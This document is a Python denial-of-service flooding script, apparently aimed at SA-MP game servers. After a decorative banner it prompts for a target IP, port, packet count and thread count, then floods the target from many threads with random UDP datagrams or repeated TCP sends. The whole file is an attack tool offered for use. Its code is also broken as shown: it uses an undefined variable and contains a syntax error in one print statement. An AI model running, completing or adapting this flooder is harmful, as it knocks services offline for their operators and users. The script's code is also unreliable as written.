#!/usr/bin/env python3
#Ddos by Mr.Dani
import random
import socket
import threading
import os
import sys
from os import system, name

os.system("clear")
print("\033[31m =========================================================================")
print("\033[31m              » TOOLS BY REMAKE BY MR DAANI «")
print("\033[31m =========================================================================")
print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print("\033[31m »DDOS ATTACK FOR SAMP")
print("\033[31m »Script Ini Dibuat Hanya Untuk Team Mr.Dani")
print("\033[31m ==========================================================================")

ip = str(input(" DdosAttackByMR.DANI | Ip:"))
port = int(input(" DdosAttackByMR.DANI | Port:"))
choice = str(input(" DdosAttackByMR.DANI | Gas Ddos Gak Ni?(y/n):"))
times = int(input(" DdosAttackByMR.DANI | Packets:"))
threads = int(input(" DdosAttackByMR.DANI | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[*]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))
		except:
			print("[!] | Server down!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[*]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))")
		except:
			s.close()
			print("[*] Down lagi Asu")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
